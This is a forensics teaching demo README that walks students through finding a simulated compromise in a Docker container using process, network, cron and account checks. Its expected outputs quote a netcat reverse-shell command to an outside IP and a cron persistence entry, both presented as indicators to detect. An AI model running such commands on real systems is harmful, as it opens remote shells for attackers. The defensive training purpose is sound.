# Demo 03: Process Analysis and Suspicious Activity Detection

## Overview

In this demo, we simulate a compromised Linux system inside Docker.
A background "malicious" process has been pre-installed that mimics common attacker behavior (reverse shell simulation, cron persistence, unusual network connection).
Students will practice identifying this activity using standard OS tools.

## Learning Objectives

* Use process analysis tools to identify suspicious processes
* Detect suspicious network connections from process IDs
* Find persistence mechanisms left by a simulated attacker
* Interpret process trees to identify unusual parent-child relationships

## Prerequisites

* Docker installed and running

## Setup

```console
cd demos/demo-03-process-analysis
docker compose up --build
```

The container starts with:

* A simulated "malware" process running in the background
* An unusual cron job
* A suspicious network connection simulation

```console
docker compose exec investigation bash
```

## Walk-through

### Step 1: Review the Running Process Tree

```bash
# Get the full process tree
ps auxf

# Expected output includes something suspicious:
# root       142  0.0  python3 /tmp/.hidden/updater.py
#     └── root  143  nc -e /bin/bash 10.10.10.5 4444

# Key observations:
# - Process in /tmp/.hidden/ (suspicious path)
# - nc (netcat) with -e flag = classic reverse shell indicator
# - Parent process is a Python script (dropper)
```

### Step 2: Investigate the Suspicious Process

```bash
# Get detailed info about the suspicious process
PID=142  # Replace with actual PID from ps output

cat /proc/$PID/cmdline | tr '\0' ' '
# Output: python3 /tmp/.hidden/updater.py

cat /proc/$PID/exe
# Should show: /usr/bin/python3 (or similar - executable location)

# Check if the executable has been deleted (common malware technique)
ls -la /proc/$PID/exe 2>&1
# If output contains "(deleted)" - the binary was deleted after execution!

# Get the working directory
ls -la /proc/$PID/cwd

# Get open file descriptors
ls -la /proc/$PID/fd
```

### Step 3: Analyze Network Connections

```bash
# Show all network connections with process information
ss -tnp

# Expected suspicious output:
# ESTAB 0 0 10.0.0.5:XXXXX 10.10.10.5:4444 users:(("nc",pid=143,fd=3))
# ^^^ outbound connection to 10.10.10.5:4444 from netcat - SUSPICIOUS!

# Also check for unusual listening ports
ss -tlnp
# Any listener not expected (like :31337, :4444, :1234) is suspicious

# Get the DNS names of suspicious remote IPs
host 10.10.10.5 2>/dev/null || echo "No DNS resolution - possibly malicious C2"
```

### Step 4: Find Persistence Mechanisms

```bash
# Check cron jobs for all users
for user in $(cut -d: -f1 /etc/passwd); do
  CRON=$(crontab -l -u $user 2>/dev/null)
  if [ -n "$CRON" ]; then
    echo "=== Cron for user: $user ==="
    echo "$CRON"
  fi
done

# Check system crontab and cron.d
cat /etc/crontab
ls -la /etc/cron.d/
for f in /etc/cron.d/*; do echo "=== $f ==="; cat $f; done

# Check for suspicious entries:
# * * * * * root /tmp/.hidden/updater.py  ← suspicious!

# Check recently modified files in /tmp
find /tmp -newer /proc/1/exe -ls 2>/dev/null

# Check for hidden directories/files
find / -name ".*" -type d -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```

### Step 5: Examine SSH Authorized Keys

```console
# Check all authorized_keys files
find /home /root -name "authorized_keys" -exec echo "=== {} ===" \; -exec cat {} \;

# An unauthorized key would look like:
# ssh-rsa AAAA...LONGSTRING... attacker@evil.com
# ^^^ any key you don't recognize should be investigated
```

### Step 6: Check for Recently Created Accounts

```console
# Review /etc/passwd for recently added accounts
cat /etc/passwd | tail -5

# Look for suspicious shells or home directories
awk -F: '{print $1, $3, $6, $7}' /etc/passwd | grep -v "/nologin\|/false"

# Check for accounts with UID 0 (root-level)
awk -F: '($3 == 0) {print $1, "has UID 0!"}' /etc/passwd
```

### Step 7: Gather Indicators of Compromise (IOCs)

Compile a list of IOCs found:

1. Process: `/tmp/.hidden/updater.py` — suspicious Python dropper
1. Network: Outbound connection to `10.10.10.5:4444` via `nc -e`
1. Persistence: Cron job running from `/tmp/.hidden/`
1. (If found) Unauthorized SSH key

## Discussion Points

1. **`/tmp` is never legitimate**: Legitimate applications should not run from `/tmp`, `/dev/shm`, or other temp directories. These are instant red flags.

1. **`nc -e` (netcat with -e flag)**: The `-e` flag executes a program and connects stdio to the network — classic reverse shell. Any process doing this should be terminated and investigated.

1. **Deleted executables**: Malware often deletes its file after execution to make forensics harder. The process still runs (file descriptor still open), but the file is gone from disk. You can recover it from `/proc/<PID>/exe`.

1. **Cron as persistence**: Cron is a simple but effective persistence mechanism. Regularly review all cron jobs on production systems.

## Clean Up

```console
docker compose down
```
